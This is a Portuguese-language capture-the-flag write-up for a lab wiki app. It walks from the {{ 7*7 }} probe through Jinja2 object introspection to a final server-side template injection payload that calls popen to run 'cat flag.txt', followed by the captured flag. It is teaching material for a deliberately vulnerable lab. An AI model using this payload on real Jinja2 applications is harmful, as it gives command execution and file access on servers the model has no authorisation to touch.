### MiniWiki Writeup - SSTI
> Desafio vulnerável a Server Side Template Injection

O MiniWiki é um laboratório simples que simula uma aplicação web de wiki, ele é vulnerável a Server Side Template Injection (SSTI) na tela de pesquisa. O input do usuário é concatenado diretamente no template que exibe o resultado da pesquisa, o que permite que um atacante injete diretivas de template do Jinja2 e, eventualmente, consiga um acesso total ao servidor.

## 1. Identificando a vulnerabilidade

Ao pesquisar algo que não existe a aplicação nos retorna um erro de conteúdo não encontrado:

![Página de não encontrado](images/image1.png)

Note como a palavra de pesquisamos é renderizada na página, isso nos da um indicativo de que vulnerabilidade podemos encontrar aqui.

Digitando {{ 7*7 }} a aplicação nos retorna 49, o que indica que a nossa entrada foi interpretada pelo template engine da aplicação:

![49 após injetar a sintaxe do Jinja2](images/image2.png)

## 2. Explorando SSTI:

Como o Jinja2 roda em Python, o objetivo do atacante é sair do contexto do template e acessar o ambiente nativo do Python para executar comandos do sistema operacional. Para isso, utiliza-se a introspecção de objetos através de atributos especiais, por exemplo:

```python
{{ "".__class__ }}
```
Isso acessa a classe de uma string. Poderiamos tentar com outros tipos de dados, já que em Python tudo em um objeto.

Injetando o payload acima, obtemos como resposta:

```python
<class 'str'>
```

Todos os objetos em Python guardam um atributo especial \_\_mro\_\_, o qual guarda a ordem de prioridade que o Python usa para buscar um método ou atributo em uma classe. Podemos então pular pra classe pai da string injetando:

```python
{{ "".__class__.__mro__ }}
```

Isso retorna:

```python
(<class 'str'>, <class 'object'>)
```

Então injetamos:

```python
{{ "".__class__.__mro__[-1] }}
```

E estamos na classe object. Como a partir daqui a exploração segue uma série de passos longos pra explicar, abaixo está o payload final fabricado pra exploração:

```python
{{ "".__class__.__mro__[-1].__subclasses__()[155].__init__.__globals__['popen']('cat flag.txt').read() }}
```

A aplicação então retorna:

```python
$FLAG!{kWcEqjhoHipI3xX}
```

E o ctf está concluído.